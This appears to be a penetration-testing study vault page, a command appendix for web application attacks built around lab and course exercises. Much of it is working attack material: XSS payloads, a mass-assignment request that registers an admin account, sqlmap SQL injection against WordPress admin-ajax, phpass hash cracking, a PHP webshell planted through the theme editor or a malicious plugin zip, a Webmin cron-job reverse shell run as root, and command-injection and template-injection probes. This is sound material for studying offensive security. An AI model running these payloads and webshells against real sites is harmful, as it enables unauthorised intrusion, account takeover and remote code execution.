# Web Applications, Command Appendix

Part of [[COMMAND APPENDIX]]. Burp Suite, XSS, API enumeration, CMS-specific attack chains, and command injection diagnosis.

---

## Burp Suite

```bash
burpsuite   # or Kali menu: Applications → 03 Web Application Analysis → burpsuite
```
**Setup:** Temporary project → Use Burp defaults → Start Burp. Proxy tab → Intercept sub-tab → toggle off (only turn on when you actually want to tamper with a request). Proxy → Options confirms the listener, default `127.0.0.1:8080`. Point the browser's manual proxy config at that same host/port (Firefox: `about:preferences#general` → Network Settings → Manual proxy configuration, enable "also for HTTPS").

**Repeater:** right-click any request in **Proxy → HTTP History** → **Send to Repeater** → edit → **Send**, resend and tweak the same request as many times as needed.

**Intruder** (brute forcing/fuzzing across a payload list):
1. Send a captured request to Intruder.
2. **Positions** tab → **Clear** the auto-marked positions, select just the value to vary, **Add**.
3. **Payloads** tab → paste candidates under **Payload Options: [Simple list]**.
4. **Start attack**, look for a response with a different status code or length than the rest, that's the hit.

```bash
# Add a static hosts entry first if the target needs a stable internal hostname
echo "<target-ip> <hostname>" | sudo tee -a /etc/hosts
```

> **Gotcha:** if Firefox's proxy is still pointed at Burp and Burp itself gets closed, Firefox stops working entirely until Burp's restarted or the proxy setting is reverted.

See [[Introduction to Web Application Attacks#8.2.4. Security Testing with Burp Suite|8.2.4]].

#### Tags: #BurpSuite #BurpProxy #BurpRepeater #BurpIntruder #EtcHosts

---

## XSS Testing and Basic Payloads

```
< > ' " { } ;
```
*Throw these into any field that gets echoed back and see what survives unencoded. `<` `>` are HTML tag delimiters, `{` `}` are JS block delimiters, `'` `"` are string delimiters, `;` is a statement terminator. If the app doesn't strip or HTML/URL-encode them, it may be treating your input as code rather than data.*

```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```
```bash
# Delivery via a header instead of a form field, e.g. testing User-Agent for stored XSS
curl -i http://<target> --user-agent "<script>alert(1)</script>" --proxy 127.0.0.1:8080
```
*Which exact payload lands depends on where your input gets reflected in the page, inside a plain `<div>` vs inside an existing `<script>` block need different shapes.*

> 🔗 **PayloadsAllTheThings** XSS Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), a much larger payload set for when the basic probes above get filtered.

See [[Introduction to Web Application Attacks#8.4.3. Identifying XSS Vulnerabilities|8.4.3]], [[Introduction to Web Application Attacks#8.4.4. Basic XSS|8.4.4]], and the WordPress-nonce-theft chain built on top of this in [[Web Applications (Breakdowns)#Nonce theft + eval(String.fromCharCode(...)): stored XSS to WordPress admin account|Command Breakdowns]].

#### Tags: #XSS #StoredXSS #ReflectedXSS #XSSPayloads

---

## API Enumeration

```bash
# Brute force versioned API paths with a pattern file (containing {GOBUSTER}/v1, {GOBUSTER}/v2, etc)
gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern

# Probe a discovered endpoint directly
curl -i http://<target>:<port>/<endpoint>

# Try a different HTTP method if you get 405 instead of 404 (path exists, wrong verb)
curl -i -X PUT http://<target>:<port>/<endpoint>

# Register with an undocumented/guessed privileged field (mass assignment)
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://<target>:<port>/users/v1/register

# Use a returned auth token (JWT, etc) against a protected endpoint
curl -X 'PUT' 'http://<target>:<port>/<endpoint>' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <token>' \
  -d '{"key": "value"}'
```
*`{GOBUSTER}` is a placeholder Gobuster substitutes per wordlist entry, then appends the pattern file's version suffix. `405 METHOD NOT ALLOWED` (not `404`) is the tell that a path exists but wants a different HTTP verb than the one just tried, see [[Web Applications (Breakdowns)#Why 405 (not 404) means the path exists, just the wrong HTTP method|Command Breakdowns]] for the full reasoning.*

See [[Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing APIs|8.3.3]], mass-assignment mechanics in [[Web Applications (Breakdowns)#Mass-assignment registration payload (undocumented admin field)|Command Breakdowns]].

> ⚡ **Modern tool:** [[Kiterunner]] automates the pattern-file guessing above with wordlists built from real OpenAPI/Swagger specs, and tries the correct HTTP method per route automatically.

#### Tags: #APIEnumeration #RESTAPI #GobusterPattern #MassAssignment #JWT

---

## WordPress

```bash
# Fingerprint installed plugin version (no auth needed)
curl http://<target>/wp-content/plugins/<plugin-name>/readme.txt
# Look for the "Stable tag:" line, then search for a matching public exploit
searchsploit <plugin name>

# Unauthenticated SQLi is common via admin-ajax.php, every plugin's AJAX actions route
# through this one shared endpoint regardless of login state
sqlmap -u "http://<target>/wp-admin/admin-ajax.php?action=<plugin_action>&<param>=1" -p <param> --batch --ignore-code=404

# Crack a dumped wp_users phpass hash ($P$... or $H$...) with John
echo 'admin:$P$<hash>' > wp_hash.txt
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wp_hash.txt

# Admin-to-RCE option 1: Appearance > Theme File Editor, paste into any template (e.g. 404.php)
<?php system($_GET['cmd']); ?>
# then trigger it by requesting a nonexistent URL (forces 404.php to render)
curl "http://<target>/nonexistent-page?cmd=id"

# Admin-to-RCE option 2 (use if option 1 fails with "Unable to communicate back with
# site, so the PHP change was reverted", WP's fatal-error-protection loopback check
# failing, common on isolated lab networks): upload a malicious plugin zip instead,
# no loopback check happens at upload time
mkdir /tmp/shell && cat > /tmp/shell/shell.php << 'EOF'
<?php
/*
Plugin Name: shell
*/
system($_GET['cmd']);
EOF
cd /tmp && zip -r shell.zip shell
# Then in the dashboard: Plugins > Add New > Upload Plugin > shell.zip > Install > Activate
curl "http://<target>/?cmd=id"
```
*The plugin-upload webshell has no hook, so it runs on every single page load once activated, not just a specific route. Same `cmd`-parameter pattern as every other webshell in this vault, just delivered via plugin activation instead of file upload/SQLi/theme edit.*

See [[SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (Perfect Survey plugin, CVE-2021-24762) for the full worked walkthrough.

#### Tags: #WordPress #WPScan #PluginRCE #PhpassCracking #AdminAjax

---

## Webmin

```
https://<target>:10000
```
*A full system administration panel. Any valid login (root or otherwise) with sufficient rights is functionally the same as remote code execution as whatever user owns the Webmin process, usually root: **System → Scheduled Cron Jobs → Create a new scheduled cron job**, set "Execute as user" to `root`, put a reverse shell one-liner in Command, set it to run within the next minute, save. Start a listener before it fires.*

*Credentials for Webmin are very often the same ones leaked from an unrelated config file elsewhere on the box, worth trying any password found during recon here even if it wasn't "meant" for Webmin.*

*If the target only supports old TLS (`TLSv1.0`/`SSLv3`, common on old CentOS-era boxes), force it explicitly rather than fighting a browser's default refusal:*
```bash
curl -k --tlsv1.0 "https://<target>:10000" 2>/dev/null
```

See [[Beep|Beep box writeup]] for the full worked chain (credential reuse into Webmin, cron job to root).

#### Tags: #Webmin #ScheduledCronJob #TLSDowngrade #CredentialReuse

---

## Command Injection Diagnosis

```bash
# Replace a command-shaped parameter value entirely with a harmless command
curl -X POST --data 'param=<harmless-command>' http://<target>/<endpoint>

# Chain a second command (URL-encoded ; or &&, CMD also accepts single &)
curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://<target>/<endpoint>

# No command-shaped hint at all? Work through systematically:
curl -X POST --data 'param=1%2B1' http://<target>/<endpoint>       # eval()? expect "2"
curl -X POST --data 'param={{7*7}}' http://<target>/<endpoint>     # Jinja2 SSTI? expect "49"
curl -X POST --data-urlencode 'param=`id`' http://<target>/<endpoint>   # plain OS injection

# CMD vs PowerShell detection on Windows (credit: PetSerAl)
# (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
See [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (both case studies, including the systematic diagnostic sequence from the capstone).

#### Tags: #CommandInjection #BlindCommandInjection #DiagnosticMethodology

---

## **Outstanding**
This area grows alongside the modules. Whenever a new CMS or web-app-specific attack chain comes up (Drupal, Joomla, Tomcat manager, etc), add it here with a link back to the source section.
